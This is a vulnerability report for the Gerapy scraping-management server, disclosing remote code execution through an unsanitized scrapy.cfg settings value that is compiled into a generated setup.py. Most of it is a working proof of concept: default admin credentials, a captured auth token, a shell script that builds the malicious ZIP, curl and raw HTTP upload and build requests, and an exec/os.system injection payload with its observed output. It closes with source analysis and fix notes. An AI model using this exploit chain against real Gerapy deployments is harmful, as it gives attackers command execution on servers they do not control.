### Vulnerability details

**Official website / Product:** https://github.com/Gerapy/Gerapy

**Repository:** Gerapy/Gerapy (stars at selection: 3515)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** Gerapy 0.9.13 (`germey/gerapy:latest`); `gerapy/server/core/build.py` byte-identical to master `f2c2a9772a718cb7879e0b6db002b7cfda7c4156` (same sha256)

**Vulnerability URL / Parameter:** `POST /api/project/<project_name>/build`; prerequisite malicious `scrapy.cfg` `[settings] default` (via `POST /api/project/upload` or project file edit APIs)

**Complex:** yes

### Verification procedure

1. Start Gerapy 0.9.13 with host port **23503→8000**:
   ```bash
   docker run -d --name gerapy-r55-a3 -p 23503:8000 germey/gerapy:latest
   # wait until http://127.0.0.1:23503/ returns 200
   ```
   Default credentials: `admin` / `admin` (image runs `gerapy initadmin`).
2. Obtain a token via `POST /api/user/auth` (DRF `obtain_auth_token`). Subsequent Upload/Build packets use the lab-captured Token `c72e14b3e6c118b88ba7b06d89f4cbbde49c5c55` (re-auth after redeploy).
3. Build a Scrapy project ZIP **without** `setup.py` (top-level dir name = project name `r55rce2`) whose `scrapy.cfg` `[settings] default` is a Python expression evaluated inside the generated `setup.py`:
   ```
   '+str(exec("import os;os.system('id>'+chr(47)+'tmp'+chr(47)+'r55a3-verify.txt')"))+'demo.settings
   ```
   Then `POST /api/project/upload` (response `{"status": true}`).
4. Call `POST /api/project/r55rce2/build` with the token and body `{"description": "r55-verify"}`.
5. Confirm `/tmp/r55a3-verify.txt` inside the container contains `id` output and inspect the generated malicious `setup.py`. HTTP returns 500 `egg not found` (egg packaging fails) after `exec` already ran during `python setup.py ...`.

### Complete vulnerability PoC

#### 0) Authenticate for Token

```http
POST /api/user/auth HTTP/1.1
Host: 127.0.0.1:23503
Content-Type: application/json
Accept: application/json
Content-Length: 37

{"username": "admin", "password": "admin"}
```

Expected response shape (token varies per deploy; later packets use the lab-captured value):

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"token":"c72e14b3e6c118b88ba7b06d89f4cbbde49c5c55"}
```

#### 1) Prerequisite: upload malicious Scrapy project ZIP

ZIP members (**no** `setup.py`):

| Path | Content |
|------|---------|
| `r55rce2/scrapy.cfg` | see below |
| `r55rce2/r55rce2/__init__.py` | empty |
| `r55rce2/r55rce2/settings.py` | `BOT_NAME="x"` + `SPIDER_MODULES=[]` |
| `r55rce2/r55rce2/spiders/__init__.py` | empty |

Full `r55rce2/scrapy.cfg`:

```ini
[settings]
default = '+str(exec("import os;os.system('id>'+chr(47)+'tmp'+chr(47)+'r55a3-verify.txt')"))+'demo.settings
```

Local rebuild and upload:

```bash
mkdir -p /tmp/r55rce2/r55rce2/spiders
printf '%s\n' "[settings]" "default = '+str(exec(\"import os;os.system('id>'+chr(47)+'tmp'+chr(47)+'r55a3-verify.txt')\"))+'demo.settings" > /tmp/r55rce2/scrapy.cfg
: > /tmp/r55rce2/r55rce2/__init__.py
printf '%s\n' 'BOT_NAME="x"' 'SPIDER_MODULES=[]' > /tmp/r55rce2/r55rce2/settings.py
: > /tmp/r55rce2/r55rce2/spiders/__init__.py
(cd /tmp && zip -r r55rce2.zip r55rce2)

curl -sS -X POST 'http://127.0.0.1:23503/api/project/upload' \
  -H 'Authorization: Token c72e14b3e6c118b88ba7b06d89f4cbbde49c5c55' \
  -H 'Accept: application/json' \
  -F 'file=@/tmp/r55rce2.zip;type=application/zip'
```

Equivalent HTTP shape (multipart; ZIP body is the binary built above — use curl `-F`, no need to hand-write raw bytes):

```http
POST /api/project/upload HTTP/1.1
Host: 127.0.0.1:23503
Authorization: Token c72e14b3e6c118b88ba7b06d89f4cbbde49c5c55
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr55a3
Accept: application/json

------WebKitFormBoundaryr55a3
Content-Disposition: form-data; name="file"; filename="r55rce2.zip"
Content-Type: application/zip

<binary: /tmp/r55rce2.zip — members as table above>
------WebKitFormBoundaryr55a3--
```

Complete HTTP upload response (Docker-verified):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 11:28:17 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: application/json
Vary: Accept, Origin
Allow: OPTIONS, POST
Content-Length: 16

{"status": true}
```

#### 2) Trigger Build (RCE)

Complete HTTP request (Docker-verified):

```http
POST /api/project/r55rce2/build HTTP/1.1
Host: 127.0.0.1:23503
Authorization: Token c72e14b3e6c118b88ba7b06d89f4cbbde49c5c55
Content-Type: application/json
Accept: application/json
Content-Length: 28

{"description": "r55-verify"}
```

Complete HTTP response (Docker-verified):

```http
HTTP/1.1 500 Internal Server Error
Date: Mon, 02 Nov 2026 11:28:17 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: application/json
Vary: Accept, Origin
Allow: OPTIONS, POST, GET
Content-Length: 28

{"message": "egg not found"}
```

Verification result notes:

The HTTP 500 `egg not found` is returned after egg packaging fails, but `python setup.py clean -a bdist_uberegg` has already evaluated the injected `exec(CMD)`. Container impact proof:

```bash
docker exec gerapy-r55-a3 ls -l /tmp/r55a3-verify.txt
docker exec gerapy-r55-a3 cat /tmp/r55a3-verify.txt
```

Observed output:

```
-rw-r--r-- 1 gerapy gerapy 57 Nov  2 11:28 /tmp/r55a3-verify.txt
uid=10000(gerapy) gid=10000(gerapy) groups=10000(gerapy)
```

Generated `setup.py` (`docker exec gerapy-r55-a3 cat /app/projects/r55rce2/setup.py`; path may vary slightly with image workdir):

```python
# Automatically created by: gerapy
from setuptools import setup, find_packages
setup(
    name='r55rce2',
    version='1.0',
    packages=find_packages(),
    entry_points={'scrapy':['settings='+str(exec("import os;os.system('id>'+chr(47)+'tmp'+chr(47)+'r55a3-verify.txt')"))+'demo.settings']},
)
```

Injected `scrapy.cfg` line:

```ini
[settings]
default = '+str(exec("import os;os.system('id>'+chr(47)+'tmp'+chr(47)+'r55a3-verify.txt')"))+'demo.settings
```

### Vulnerability analysis

When Build runs and `setup.py` is missing, Gerapy calls `create_default_setup_py()`, which fills `_SETUP_PY_TEMPLATE` with old-style `%` formatting using the Scrapy settings module path from `scrapy.cfg` and the project name, then executes the file via `check_call([sys.executable, 'setup.py', 'clean', '-a', 'bdist_uberegg', '-d', d])`.

`[settings] default` is assumed to be a benign identifier such as `demo.settings`, but it is never allowlisted or escaped. An attacker can inject an expression that runs while `setup(` keyword arguments are evaluated (e.g. `'+str(exec("import os;os.system(CMD)"))+'demo.settings`), achieving command execution as the Gerapy process user during the egg build. `utils.is_valid_name()` exists but is unused for these Build inputs.

This is distinct from the designed ability to upload an arbitrary `setup.py` and build it: here a **declarative config field is unsafely compiled into generated code** — an unexpected sink / incomplete sanitization.

Trigger / sink source (full path and line numbers):

```python
# File: gerapy/server/core/build.py
# Lines: 28-36, 49-80, 95-109
_SETUP_PY_TEMPLATE = \
    '''# Automatically created by: gerapy
from setuptools import setup, find_packages
setup(
    name='%(project)s',
    version='1.0',
    packages=find_packages(),
    entry_points={'scrapy':['settings=%(settings)s']},
)'''

def build_egg(project):
    work_path = os.getcwd()
    try:
        path = os.path.abspath(join(os.getcwd(), PROJECTS_FOLDER))
        project_path = join(path, project)
        os.chdir(project_path)
        settings = config(project_path, 'settings', 'default')
        setup_file_path = join(project_path, 'setup.py')
        create_default_setup_py(
            setup_file_path, settings=settings, project=project)
        d = tempfile.mkdtemp(prefix='gerapy-')
        o = open(os.path.join(d, 'stdout'), 'wb')
        e = open(os.path.join(d, 'stderr'), 'wb')
        retry_on_eintr(check_call, [sys.executable, 'setup.py', 'clean', '-a', 'bdist_uberegg', '-d', d],
                       stdout=o, stderr=e)
        o.close()
        e.close()
        egg = glob.glob(os.path.join(d, '*.egg'))[0]
        if find_egg(project_path):
            os.remove(join(project_path, find_egg(project_path)))
        shutil.move(egg, project_path)
        return join(project_path, find_egg(project_path))
    except Exception as e:
        logger.error('error occurred %s', e.args)
    finally:
        os.chdir(work_path)

def create_default_setup_py(path, **kwargs):
    if os.path.exists(path):
        logger.debug('setup.py file already exists at %s', path)
    else:
        with open(path, 'w', encoding='utf-8') as f:
            file = _SETUP_PY_TEMPLATE % kwargs
            f.write(file)
            f.close()
            logger.debug('successfully created setup.py file at %s', path)
```

```python
# File: gerapy/server/core/views.py
# Lines: 523-530
    elif request.method == 'POST':
        data = json.loads(request.body)
        description = data['description']
        build_project(project_name)
        egg = find_egg(project_path)
        if not egg:
            return JsonResponse({'message': 'egg not found'}, status=500)
```

```python
# File: gerapy/server/core/config.py
# Lines: 4-20
def config(path, section, option, name='scrapy.cfg', default=None):
    try:
        cf = configparser.ConfigParser()
        cfg_path = join(path, name)
        cf.read(cfg_path)
        return cf.get(section, option)
    except configparser.NoOptionError:
        return default
```

### Fix notes

1. Allowlist `project` / `settings` values written into `_SETUP_PY_TEMPLATE` (reuse `is_valid_name` / `^[_a-zA-Z][\w.]*$`); reject all other characters.
2. Stop generating executable Python via `%` concatenation; emit constants safely or drive setuptools APIs directly.
3. Validate generated `setup.py` before execution, or build inside a sandbox.
